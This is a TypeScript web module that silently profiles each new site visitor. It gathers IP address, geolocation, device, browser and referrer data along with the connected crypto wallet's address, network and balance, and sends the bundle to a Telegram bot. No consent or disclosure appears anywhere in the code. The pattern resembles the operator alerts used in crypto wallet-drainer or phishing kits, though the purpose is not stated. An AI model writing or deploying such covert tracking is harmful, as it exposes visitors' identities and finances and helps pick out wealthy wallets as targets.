import { StorageManager } from './storage';
import { sendToTelegram } from './telegram';

export interface UserInfo {
  ip: string;
  websiteInfo: {
    url: string;
    title: string;
    referrer: string;
  };
  location: {
    city?: string;
    country?: string;
    region?: string;
  };
  device: {
    type: 'Desktop' | 'Mobile' | 'Tablet';
    browser: string;
    os: string;
    userAgent: string;
  };
  wallet: {
    address?: string;
    network?: {
      name: string;
      chainId: number;
    };
    balance?: {
      eth: string;
      usd?: string;
    };
    isConnected: boolean;
  };
}

export async function initializeUserTracking(walletInfo: UserInfo['wallet']): Promise<void> {
  if (StorageManager.shouldNotifyNewVisit()) {
    console.log('New visit detected - collecting user information...');
    
    try {
      const userInfo = await getUserInfo(walletInfo);
      
      // Send to telegram bot
      const messageSent = await sendToTelegram(userInfo);
      
      if (messageSent) {
        StorageManager.setVisitTimestamp();
        console.log('Visit recorded and notification sent');
      }
    } catch (error) {
      console.error('Error processing new visit:', error);
    }
  } else {
    console.debug('Recent visit detected - skipping notification');
  }
}

async function getUserInfo(walletInfo: UserInfo['wallet']): Promise<UserInfo> {
  try {
    // Get IP address using a public API
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const { ip } = await ipResponse.json();

    // Get location information using IP
    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
    const locationData = await locationResponse.json();

    // Detect device type
    const userAgent = navigator.userAgent;
    const isMobile = /Mobile|Android|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(userAgent);
    const isTablet = /Tablet|iPad/i.test(userAgent);
    const deviceType = isTablet ? 'Tablet' : isMobile ? 'Mobile' : 'Desktop';

    // Get browser and OS info
    const browser = detectBrowser();
    const os = detectOS();

    // Build complete user info with provided wallet info
    return {
      ip,
      websiteInfo: {
        url: window.location.origin + window.location.pathname,
        title: document.title,
        referrer: document.referrer || 'Direct'
      },
      location: {
        city: locationData.city,
        country: locationData.country_name,
        region: locationData.region
      },
      device: {
        type: deviceType,
        browser,
        os,
        userAgent
      },
      wallet: walletInfo // Use the wallet info passed from the component
    };
  } catch (error) {
    console.error('Error collecting user information:', error);
    throw error;
  }
}

function detectBrowser(): string {
  const ua = navigator.userAgent;
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Safari")) return "Safari";
  if (ua.includes("Edge")) return "Edge";
  if (ua.includes("Opera")) return "Opera";
  return "Unknown";
}

function detectOS(): string {
  const ua = navigator.userAgent;
  if (ua.includes("Windows")) return "Windows";
  if (ua.includes("Mac OS")) return "macOS";
  if (ua.includes("Linux")) return "Linux";
  if (ua.includes("Android")) return "Android";
  if (ua.includes("iOS")) return "iOS";
  return "Unknown";
}